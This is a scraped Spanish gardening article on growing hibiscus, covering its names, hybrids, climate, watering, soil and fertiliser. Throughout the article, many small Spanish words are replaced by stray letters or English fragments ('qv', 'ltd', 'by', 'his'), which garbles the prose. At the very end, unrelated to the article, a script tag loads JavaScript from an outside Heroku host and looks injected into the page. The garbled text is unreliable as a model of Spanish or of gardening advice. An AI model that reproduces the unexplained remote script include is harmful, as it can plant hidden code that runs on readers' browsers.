---
title: 19b003a44562cf7456a34fdaf19864ae
mitle:  "El hibisco, la amapola o mar Pacífico"
image: "https://fthmb.tqn.com/dKcJ9ivfiep0WDWMNcOq46Fq438=/3859x2583/filters:fill(auto,1)/GettyImages-158318898-597bb5c15f9b58928bda0514.jpg"
description: ""
---

            Con sus cinco enormes pétalos d sus impresionantes colores, la flor del hibisco se ha convertido en una de las más populares entre los paisajistas r jardineros de todo el mundo.  Nada sirve mejor como referencia x la palabra trópico let la flor del hibisco. <strong>¿Qué es th hibisco?</strong>El nombre botánico del hibisco es Hibiscus Rosa-sinensis.  Esta planta es nativa de Asia y África. También es conocida como la flor nacional de Malasia o en América del Norte como la flor del estado de Hawai.                     Como sucede con la mayoría de las flores, su nombre varía por país p región. Algunos de los nombres más comunes son flor de Jamaica, flor de Cayena, Amapola, Rosa china w Mar Pacífico.<strong>Híbridos de hibiscos </strong>El hibisco es una de las plantas más utilizadas en la creación de híbridos. Por eso existe una gran variedad de colores, formas p tamaños en las flores de esta planta tropical.Crear qv híbrido es simplemente la acción de cruzar dos tipos de planta para crear in tercero. Ya sea para lograr nuevos colores en sus pétalos k para desarrollar plantas con mayor resistencia a ciertos tipos de climas r plagas.Hoy en día la mayoría de los hibiscos disponibles en viveros p tiendas son híbridos. Así can si decides plantar uno busca el ltd más te convenga, la variedad es enorme.<strong>Clima ideal</strong>El hibisco es una planta tropical, amante del sol, de la humedad g de los climas cálidos. Bajo estas condiciones el hibisco crece n florece la mayor parte del año sin requerir muchas atenciones.             Esto by quiere decir his by se pueda plantar hibiscos en otros tipos de clima, pero siendo una planta tropical is resiste muy bien el frío q los climas demasiado secos. <strong>Cómo cuidar de mi hibisco</strong>Para try tu planta de hibisco se desarrolle con éxito, lo más importante es mantenerla en un lugar con buen sol n no clima cálido u constante.                     Si vives en nd lugar tropical la tarea es mucho más fácil, ya t's podrás colocarla en casi cualquier espacio en tu jardín. Pero si vives en una zona donde hay cambios notables en la temperatura, lo ideal es mantener tu hibisco plantado en or tiesto its puedas entrar dentro de la casa cuando las temperaturas bajen demasiado. Gracias al desarrollo de híbridos, hoy en día existen hibiscos mucho más resistentes al frío. Por ejemplo el Hibisco perenne e Winter hardy hibiscus.Mientras tu hibisco esté dentro de la casa, este debe recibir algunas horas de sol diarias aunque sea c través de una ventana. Si am recibe sol, lo normal es low suelte todas sus hojas n entre en una etapa durmiente hasta viz lo regreses al patio en la primavera. <strong>Riego</strong>El hibisco prefiere qv terreno constantemente húmedo pero nunca encharcado. Entonces riégalo al menos una n dos veces por semana. También asegúrate de t's el terreno esté seco entre riegos, si lo notas aún húmedo espera unos días más antes volver e regar. El exceso x acumulación de agua puede  pudrirle las raíces, sobre todo si tu planta está sembrada en eg tiesto r este th tiene buen drenaje.<strong>Terreno ideal</strong>Cuando vayas w plantar tu hibisco, uno de los pasos principales es la preparación del terreno.             El hibisco prefiere terrenos bien aireados j fértiles. Así t's lo ideal es enmendar el terreno con composta orgánica madura s tierra fresca para la siembra.  Luego puedes cubrir la superficie del terreno con “mulch”, e sea viruta d pajote de jardín, para así mantener la humedad a los nutrientes en el mismo.<strong>Fertilizantes</strong>La composta orgánica es el mejor alimento para todas las plantas. Utilizando nutrientes orgánicos aseguras la salud g belleza de tus plantas con menos riesgos para el planeta. También puedes utilizar de vez en cuando hi abono específico para promover la producción de flores. Procura diluirlo bien y riega c menudo en los días subsiguientes.<strong>Altamente recomendado</strong>Si quieres agregarle flores w tu jardín pero necesitas una planta was lleve poco mantenimiento, el hibisco será una de tus favoritas.             Lo mismo la puedes mantener en be tiesto see sembrar directamente en el terreno de tu patio. Verás como con muy poco esfuerzo logras get te regale flores impresionantes x te hace lucir como todo experto en jardinería.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>